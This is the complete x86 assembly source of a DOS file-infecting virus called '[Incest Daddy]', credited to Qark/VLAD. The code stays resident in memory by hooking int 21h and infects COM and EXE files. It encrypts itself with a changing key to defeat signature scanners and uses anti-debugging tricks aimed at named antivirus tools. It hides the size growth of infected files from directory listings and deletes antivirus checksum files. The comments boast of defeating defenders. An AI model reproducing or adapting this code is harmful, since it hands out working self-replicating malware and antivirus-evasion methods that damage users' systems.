       org     0                                                              
                                                                              
entry:                                                                        
       call    crap_ret                        ;Get IP                        
                                                                              
return_here:                                    ;Where the ret will return.   
                                                                              
       mov     word ptr cs:[si+offset quit], 20cdh                            
quit:                                           ;Put an 'int 20h' here.       
                                                ;Because of DOS's prefetch    
                                                ;queue, it will glide over    
                                                ;it, while f-prot/debug etc   
                                                ;will stop here.              
                                                                              
                                               ;Put this in last because      
                                               ;it really fucks up debug.     
                                               ;Also, it fucks TBClean.       
                                                                              
       cmp     byte ptr cs:[si+exe_com],1                                     
       je      com_start                                                      
                                                                              
       ;Exe shit in here.                                                     
                                                                              
       mov     word ptr cs:[si+offset orig_sp],sp                             
       mov     word ptr cs:[si+offset orig_ss],ss                             
                                                                              
       cli                                                                    
       mov     dx,cs                                                          
       mov     ss,dx                                                          
       mov     sp,si                                                          
       add     sp,offset stackend                                             
       sti                                                                    
                                                                              
       call    unencrypt                                                      
                                                                              
       call    install_tsr                                                    
       jmp     exe_end                  ;Jump down so that bit is inside      
                                        ;the encryption.                      
                                                                              
unencrypt       proc    near             ;Setup for unencryption.             
                                                                              
       mov     al,byte ptr cs:[si+offset encryptor]                           
       push    si                                                             
       add     si,offset enc_start                                            
                                                                              
       call    encrypt                                                        
                                                                              
       pop     si                                                             
                                                                              
       ret                                                                    
unencrypt       endp                                                          
                                                                              
com_start:                                                                    
                                                                              
       call    unencrypt                                                      
                                                                              
enc_start:                                                                    
                                                                              
       call    install_tsr                                                    
                                                                              
       ;Restore orig 3 bytes.                                                 
                                                                              
       add     si,offset old3                                                 
       mov     di,100h                                                        
       mov     cx,3                                                           
       rep     movsb                                                          
                                                                              
       mov     si,0ffh                                                        
       inc     si                                                             
       push    si                                                             
       ret                                                                    
                                                                              
exe_end:                                                                      
                                                                              
       ;add es,10h                                                            
                                                                              
       mov     dx,es                                                          
       add     dx,10h                                                         
                                                                              
       ;add original offset of cs in paragraphs.                              
                                                                              
       add     word ptr cs:[si+jump+2],dx                                     
                                                                              
       ;now you have your cs to jump to                                       
       ;move it where we want it then jump to it.                             
                                                                              
       cli                                                                    
                                                                              
       mov     sp,word ptr cs:[si+orig_sp]                                    
       mov     ss,word ptr cs:[si+orig_ss]                                    
                                                                              
       sti                                                                    
       xor     dx,dx                                                          
       xor     si,si                                                          
                                                                              
       db      0eah                    ;JMPF                                  
                                                                              
       jump    dw      0                                                      
               dw      0                                                      
                                                                              
                                                                              
install_TSR     proc    near                                                  
;Should work with both EXE's and COM's.                                       
                                                                              
       push    ax                                                             
       push    bx                                                             
       push    cx                                                             
       push    dx                                                             
       push    ds                                                             
       push    es                                                             
                                                                              
;Test to see whether daddy is home.                                           
                                                                              
       mov     ah,61h                         ;Daddy!                         
       mov     di,'DA'                                                        
       mov     bx,'D'                                                         
       int     21h                                                            
                                                                              
       ;do compares here...                                                   
       cmp     cx,'DA'                                                        
       jne     go_tsr                                                         
       jmp     jend                                                           
                                                                              
go_tsr:                                                                       
                                                                              
       xor     ax,ax                           ;Segment 0... where the        
       mov     es,ax                           ;interrupt table lurks...      
                                                                              
       mov     ax,word ptr es:[132]            ;Put int21 in i21...           
       mov     word ptr cs:[si+offset i21],ax                                 
       mov     word ptr cs:[si+offset int21_2],ax                             
       mov     ax,word ptr es:[134]                                           
       mov     word ptr cs:[si+offset i21 + 2],ax                             
       mov     word ptr cs:[si+offset int21_2 + 2],ax                         
                                                                              
;Check for incest family marker here...                                       
                                                                              
       mov     ah,61h                         ;Sis!(ter)                      
       mov     di,'IN'                                                        
       int     21h                                                            
                                                                              
       cmp     di,'NI'                                                        
       jne     not_incest                                                     
                                                                              
       mov     word ptr cs:[si+offset int21_2],cx                             
       mov     word ptr cs:[si+offset int21_2+2],dx                           
                                                                              
not_incest:                                                                   
                                                                              
       mov     ax,ds                                                          
       dec     ax                                                             
       mov     es,ax                           ;MCB segment.                  
       cmp     byte ptr es:[0],5ah             ;'Z' - last MCB.               
       jne     jend                                                           
       sub     word ptr es:[3],150                                            
       sub     word ptr es:[12h],150           ;150*16 bytes less memory.     
                                                                              
       mov     ax,es:[12h]                     ;find virus MCB segment        
       mov     es,ax                           ;es=virus MCB segment          
       mov     byte ptr es:[0],5ah             ;mark as last in MCB chain     
       mov     word ptr es:[1],8               ;DOS now owns this             
       mov     word ptr es:[3],2384            ;set the size of segment       
       inc     ax                              ;ax=virus segment              
       mov     es,ax                           ;es=virus segment              
       mov     di,offset entry                                                
       mov     cx,length                       ;virus size                    
       push    cs                                                             
       pop     ds                                                             
       push    si                                                             
       rep     movsb                           ;copy virus to TOM             
       pop     si                                                             
                                                                              
       mov     bx,es                                                          
                                                                              
       xor     ax,ax                           ;es = segment of vector table  
       mov     es,ax                                                          
                                                                              
       mov     ax,offset infection             ;change vector table to point  
       cli                                                                    
       mov     word ptr es:[132],ax            ;to our virus...               
       mov     word ptr es:[134],bx                                           
       sti                                                                    
                                                                              
jend:                                                                         
       pop     es                                                             
       pop     ds                                                             
       pop     dx                                                             
       pop     cx                                                             
       pop     bx                                                             
       pop     ax                                                             
                                                                              
       ret                                                                    
                                                                              
install_TSR     endp                                                          
                                                                              
                                                                              
       ;###### Here is the Details ######                                     
                                                                              
Virus_Name      db      '[Incest Daddy]',0                                    
Author          db      'by Qark/VLAD',0                                      
                                                                              
                                                                              
old3    db      0cdh,20h,0              ;Storage for the bytes in com files   
                                                                              
infection       proc    far                                                   
                                                                              
       cmp     ah,4bh                                                         
       je      test_file                                                      
       cmp     ah,43h                                                         
       je      test_file                                                      
       cmp     ah,56h                                                         
       je      test_file                                                      
       cmp     ax,6c00h                                                       
       je      test_file                                                      
       cmp     ah,3dh                                                         
       je      test_file                                                      
                                                                              
       cmp     ah,11h                                                         
       je      dir_listing                                                    
       cmp     ah,12h                                                         
       je      dir_listing                                                    
                                                                              
       ;insert residency test here...                                         
                                                                              
       cmp     ah,61h                                                         
       jne     not_testing                                                    
       cmp     di,'DA'                                                        
       jne     chk4incest                                                     
       cmp     bx,'D'                                                         
       jne     not_testing                                                    
       mov     cx,'DA'                         ;Return test parameters.       
                                                                              
       iret                                                                   
                                                                              
chk4incest:                                                                   
                                                                              
       cmp     di,'IN'                                                        
       jne     not_testing                                                    
       mov     di,'NI'                         ;Incest Marker...              
       mov     cx,word ptr cs:[int21_2]                                       
       mov     dx,word ptr cs:[int21_2 + 2]   ;Pass original int21h out.      
       iret                                                                   
                                                                              
dir_listing:                                                                  
                                                                              
       jmp     dir_stealth                                                    
                                                                              
not_testing:                                                                  
                                                                              
       jmp     far_tsr_end                                                    
                                                                              
test_file:                                                                    
                                                                              
       push    ax                                                             
       push    bx                                                             
       push    cx                                                             
       push    dx                                                             
       push    ds                                                             
       push    es                                                             
       push    si                                                             
       push    di                                                             
                                                                              
       cmp     ah,6ch                                                         
       jne     no_fix_6c                                                      
       mov     dx,si                                                          
                                                                              
no_fix_6c:                                                                    
       cld                             ;Clear Direction Flag.                 
       mov     si,dx                   ;Filename being executed.              
       dec     si                                                             
find_ascii_z:                                                                 
       inc     si                                                             
       cmp     byte ptr ds:[si],0      ;Find end of ASCIIZ name.              
       jne     find_ascii_z                                                   
                                                                              
       sub     si,4                    ;Length of '.EXE'                      
                                                                              
       cmp     word ptr ds:[si],'E.'                                          
       je      exe_found1                                                     
       jmp     cmp_com                                                        
exe_found1:                                                                   
       cmp     word ptr ds:[si+2],'EX'         ;Test for '.EXE'               
       je      exe_found2                                                     
cmp_com:                                                                      
       cmp     word ptr ds:[si],'C.'                                          
       je      com_found1                                                     
       jmp     filename_exit                                                  
com_found1:                                                                   
       cmp     word ptr ds:[si+2],'MO'         ;Test for '.COM'               
       jne     filename_exit                                                  
       mov     byte ptr cs:exe_com,1                                          
       jmp     do_file                                                        
                                                                              
filename_exit:                                                                
                                                                              
       jmp     f_pop_exit                                                     
                                                                              
exe_found2:                                                                   
                                                                              
       mov     byte ptr cs:[exe_com],0                                        
                                                                              
Do_file:                                                                      
                                                                              
       mov     ax,3d02h                                                       
       call    int21h                                                         
                                                                              
       jc      filename_exit                                                  
                                                                              
       mov     bx,ax                                                          
                                                                              
       xor     ax,ax                                                          
       mov     es,ax                                                          
       mov     ax,word ptr es:[144]                                           
       mov     word ptr cs:[i24],ax                                           
       mov     ax,word ptr es:[146]                                           
       mov     word ptr cs:[i24+2],ax                  ;Save int24h           
       mov     word ptr es:[144],offset int24h                                
       mov     es:[146],cs                             ;Cool handler!         
                                                                              
       push    dx                              ;Save the path for l8r         
                                                                              
       mov     ax,5700h                                                       
       call    int21h                          ;Save the file date for        
                                               ;later use.                    
                                                                              
       mov     cs:filetime,cx                  ;File date and Time.           
       mov     cs:filedate,dx                                                 
                                                                              
       cmp     cx,dx                                                          
       jne     infect                                                         
                                                                              
       pop     dx                              ;Pop this or everything will   
                                               ;stuff up.                     
                                                                              
       jmp     far_close_exit                                                 
                                                                              
infect:                                                                       
                                                                              
       pop     dx                              ;DS:DX = path of infectee.     
                                                                              
       call    del_crc_files                   ;Delete some CRC checkers.     
                                                                              
       ;Com and Exe go their separate ways...                                 
                                                                              
       cmp     byte ptr exe_com,0                                             
       je      exe_infection                                                  
       jmp     com_infection                                                  
                                                                              
exe_infection:                         ;My Exe infection code is lame!!!!     
       ;read in header                                                        
                                                                              
       mov     ah,3fh                                                         
       mov     cx,1ah                                                         
       mov     dx,offset header                ;Read the header in here.      
       call    int21h                                                         
                                                                              
       mov     si,offset header                ;Index to the header.          
                                                                              
       mov     cx,word ptr [si]                ;MZ header.                    
       add     ch,cl                           ;Add M+Z = 167.                
       cmp     ch,167                                                         
       je      good_exe                                                       
                                                                              
       jmp     far_close_exit                                                 
                                                                              
good_exe:                                                                     
                                                                              
       ;convert headersize to bytes                                           
                                                                              
       mov     ax,word ptr [si+8]                                             
       mov     cl,4                                                           
       shl     ax,cl                           ;Mul by 16 - paragraphs        
                                                                              
       mov     word ptr hsize,ax               ;Header size in bytes.         
                                                                              
       ;save original cs & ip for later use                                   
                                                                              
       mov     ax,word ptr [si+14h]                                           
       mov     word ptr jump,ax                                               
       mov     ax,word ptr [si+16h]                                           
       mov     word ptr jump+2,ax                                             
                                                                              
       ;end of file                                                           
                                                                              
       mov     al,2                            ;Go to EOF.                    
       call    lseek                                                          
                                                                              
       ;get file length                                                       
                                                                              
       ;convert length to paragraph/offset form                               
                                                                              
       sub     ax,word ptr hsize                                              
       sbb     dx,0                                                           
                                                                              
       mov     cx,10h                                                         
       div     cx                                                             
                                                                              
       ;write to header                                                       
                                                                              
       mov     word ptr [si+14h],dx            ;New IP/CS                     
       mov     word ptr [si+16h],ax                                           
                                                                              
       ;fix up encryption                                                     
                                                                              
       call    encrypt_setup                                                  
                                                                              
       ;write virus to eof                                                    
                                                                              
       mov     ah,40h                                                         
       mov     cx,length                       ;Virus Size                    
       mov     dx,offset stackend                                             
       call    int21h                                                         
                                                                              
       jc      far_close_exit                                                 
                                                                              
       ;get new file length                                                   
                                                                              
       mov     al,2                            ;EOF again.                    
       call    lseek                                                          
                                                                              
       ;work out number of pages and write to header                          
                                                                              
       push    dx                              ;Save them.                    
       push    ax                                                             
       mov     cx,512                          ;Page Size = 512.              
       div     cx                                                             
       inc     ax                                                             
                                                                              
       mov  word ptr [si+4],ax                 ; new file size                
                                                                              
       pop     ax                                                             
       pop     dx                                                             
                                                                              
       sub     ax,word ptr hsize                                              
       sbb     dx,0                                                           
       mov     cx,512                                                         
       div     cx                                                             
                                                                              
       mov  word ptr [si+2],dx                 ;Size of last page.            
                                                                              
       mov     al,0                            ;Start of file.                
       call    lseek                                                          
                                                                              
       mov     ah,40h                          ;Write header.                 
       mov     dx,offset header                                               
       mov     cx,1ah                                                         
       call    int21h                                                         
                                                                              
time_Exit:                                                                    
                                                                              
       mov     ax,5701h                        ;Restore file time.            
       mov     cx,filedate                                                    
       mov     dx,filedate                                                    
       call    int21h                                                         
                                                                              
far_close_exit:                                                               
                                                                              
       mov     ah,3eh                          ;Close file.                   
       call    int21h                                                         
                                                                              
       xor     ax,ax                                                          
       mov     es,ax                           ;Interrupt vector table at     
       mov     ax,word ptr cs:[i24]            ;Segment 0.                    
       mov     es:[144],ax                                                    
       mov     ax,word ptr cs:[i24+2]                                         
       mov     es:[146],ax                     ;Reset int 24h                 
                                                                              
f_pop_exit:                                                                   
                                                                              
       pop     di                                                             
       pop     si                                                             
       pop     es                                                             
       pop     ds                                                             
       pop     dx                              ;Restore everything.           
       pop     cx                                                             
       pop     bx                                                             
       pop     ax                                                             
                                                                              
far_tsr_end:                                                                  
                                                                              
       db       0eah                            ;Self modifying code here.    
       i21      dd      0                                                     
                                                                              
com_infection:                                                                
                                                                              
       mov     ah,3fh                                                         
       mov     cx,3                            ;CX = no. to read              
       mov     dx,offset old3                  ;Read into old3                
       call    int21h                          ;Read 1st three bytes          
                                                                              
       mov     al,02h                          ;Seek to end of file           
       call    lseek                           ;End of file                   
                                                                              
       push     ax                                                            
                                                                              
       call    encrypt_setup                                                  
                                                                              
       mov     dx,offset stackend              ;Address of virus              
       mov     cx,length                       ;Length of virus               
       mov     ah,40h                                                         
       call    int21h                          ;Write virus to file           
                                                                              
       jc      far_close_exit                                                 
                                                                              
       xor     al,al                           ;Seek to start                 
       call    lseek                           ;Start of file                 
                                                                              
       pop     ax                              ;Restore file length           
       sub     ax,3                                                           
       mov     cs:[jumpbit+1],ax                                              
                                                                              
       mov     dx,offset jumpbit               ;Address of start              
       mov     ah,40h                                                         
       mov     cx,3                            ;Write three bytes             
       call    int21h                          ;Write jump for                
                                               ;file newly infected.          
                                                                              
       jmp     time_exit                                                      
                                                                              
       jumpbit db      0e9h,0,0                                               
                                                                              
       hsize           dw      0               ;Header size in bytes.         
                                                                              
       filedate        dw      0               ;File date.                    
       filetime        dw      0               ;File time.                    
                                                                              
dir_stealth:                                                                  
                                                                              
       ;This bit means that when you do a 'dir' there is no change in         
       ;file size.                                                            
                                                                              
       call    int21h                          ;Call the interrupt            
       cmp     al,0                            ;straight off.                 
       jne     end_of_dir                                                     
                                                                              
       push    es                                                             
       push    ax                              ;Save em.                      
       push    bx                                                             
       push    si                                                             
                                                                              
       mov     ah,2fh                          ;Get DTA address.              
       int     21h                                                            
                                                                              
       mov     si,bx                                                          
       cmp     byte ptr es:[si],0ffh           ;Extended FCB ?                
       jne     not_extended                                                   
                                                                              
       add     si,7                            ;Add the extra's.              
                                                                              
not_extended:                                                                 
                                                                              
       mov     cx,word ptr es:[si+17h]         ;Move time and date.           
       mov     ax,word ptr es:[si+19h]                                        
                                                                              
       cmp     ax,cx                           ;Are time and date equal ?     
       jne     dir_pop                                                        
                                                                              
       sub     word ptr es:[si+1dh],length     ;Subtract the file length.     
       sbb     word ptr es:[si+1fh],0                                         
                                                                              
dir_pop:                                                                      
                                                                              
       pop     si                                                             
       pop     bx                                                             
       pop     ax                                                             
       pop     es                                                             
                                                                              
end_of_dir:                                                                   
                                                                              
       iret                            ;Return to caller.                     
                                                                              
                                                                              
;Sets up the encryption for the TSR.                                          
encrypt_setup   proc    near                                                  
                                                                              
       mov     word ptr quit,802eh             ;Move the bytes changed by     
                                               ;the anti-debugging code       
                                               ;back to the start.            
                                                                              
       cmp     byte ptr encryptor,0ffh                                        
       jne     not_zero                                                       
                                                                              
       inc     byte ptr encryptor              ;Make sure it's not zero.      
not_zero:                                                                     
                                                                              
       inc     byte ptr encryptor              ;Change the encryptor to fuck  
       mov     al,byte ptr encryptor           ;up all those signature        
                                               ;scanners...                   
                                                                              
       push    si                                                             
       push    cs                                                             
       pop     es                                                             
       mov     si,offset entry                                                
       mov     di,offset stackend                                             
       mov     cx,length                                                      
       rep     movsb                                                          
                                                                              
       mov     si,offset stackend + offset enc_start                          
       call    encrypt                                                        
       pop     si                                                             
                                                                              
       ret                                                                    
Encrypt_Setup   endp                                                          
                                                                              
                                                                              
Del_CRC_Files   proc    near                                                  
                                                                              
; Deletes AV CRC checking files.  This saves the user a heap of disk space.   
; Aren't we just good guys ?! :)                                              
                                                                              
       push    cs                              ;ES=CS                         
       pop     es                                                             
                                                                              
       add     si,4                            ;SI=End of ASCIIZ name.        
       mov     cx,si                                                          
       sub     cx,dx                           ;CX=Length of string.          
       mov     si,dx                           ;SI=Start of ASCIIZ            
       mov     di,offset stackseg              ;Put it all in stackseg        
       rep     movsb                           ;Move it!                      
                                                                              
       push    cs                              ;DS=CS                         
       pop     ds                                                             
                                                                              
       mov     si,offset file1                 ;First file.                   
                                                                              
find_path:                                                                    
       cmp     byte ptr [di],'\'               ;Looking for a slash.          
       je      add_name                        ;Found a slash!                
       cmp     di,offset stackseg              ;Slashless :(                  
       je      no_slash                                                       
       dec     di                                                             
       jmp     find_path                                                      
no_slash:                                                                     
       mov     word ptr stackseg,'\.'          ;Put or own slash in...        
       inc     di                              ;Default directory.            
add_name:                                                                     
       inc     di                                                             
                                                                              
       mov     cx,13                           ;Move our filename in.         
       rep     movsb                                                          
                                                                              
       mov     dx,offset stackseg              ;Delete it!                    
       mov     ah,41h                                                         
       call    int21h                                                         
                                                                              
       cmp     si,offset lseek                 ;Finished deleting.            
       jne     find_path                                                      
                                                                              
       ret                                                                    
Del_CRC_Files   endp                                                          
                                                                              
       file1   db      'ANTI-VIR.DAT',0        ;Get rid of these pests.       
       file2   db      'MSAV.CHK',0,0,0,0,0                                   
       file3   db      'CHKLIST.CPS',0,0                                      
       file4   db      'CHKLIST.MS',0,0,0                                     
                                                                              
                                                                              
LSeek   proc    near                                                          
; Al = 0 = Start of file  ||||  Al = 2 = End of file                          
                                                                              
       mov     ah,42h                                                         
       xor     cx,cx                                                          
       xor     dx,dx                                                          
       call    int21h                                                         
                                                                              
       ret                                                                    
Lseek   endp                                                                  
                                                                              
                                                                              
int24h  proc    near    ;Stops embarassing error messages on write protected  
                        ;diskettes...                                         
      mov     al,3                                                            
      iret                                                                    
int24h  endp                                                                  
                                                                              
       i24     dd      0                       ;Original int24h               
                                                                              
int21h  proc    near                            ;False int21h                 
                                                                              
       pushf                                                                  
       db      9ah                             ;'Call far ptr' opcode.        
       int21_2 dd      0                       ;Save second int 21h here...   
enc_end:                                                                      
       ret                                                                    
                                                                              
int21h  endp                                                                  
                                                                              
;This routine must remain outside of the encryption.                          
crap_ret        proc    near            ;Crappy 'Ret' routine to get IP.      
                mov     bp,sp                                                 
                mov     si,word ptr ss:[bp]                                   
                sub     si,offset return_here                                 
                xor     bp,bp                                                 
                ret                                                           
crap_ret        endp                                                          
                                                                              
encrypt proc    near                                                          
;SI = Offset of bit to be encrypted                                           
;AL = Encryptor                                                               
       push    cx                                                             
                                                                              
       mov     cx,offset enc_end - offset enc_start                           
enc_loop:                                                                     
       ror     al,1                                                           
       neg     al                                                             
       xor     byte ptr cs:[si],al                                            
       inc     si                                                             
       loop    enc_loop                                                       
                                                                              
       pop     cx                                                             
       ret                                                                    
encrypt endp                                                                  
                                                                              
encryptor       db      0                                                     
                                                                              
exe_com         db      1               ;Exe or com file ? 1 = com            
                                                                              
       orig_sp         dw      0                                              
       orig_ss         dw      0                                              
                                                                              
       header          db 1ah dup (0)                                         
                                                                              
       ;The temporary stack.                                                  
                                                                              
       stackseg        db      100 dup (0)                                    
       stackend        db      0                                              
                                                                              
       length  equ     offset header           ;The length of the virus.
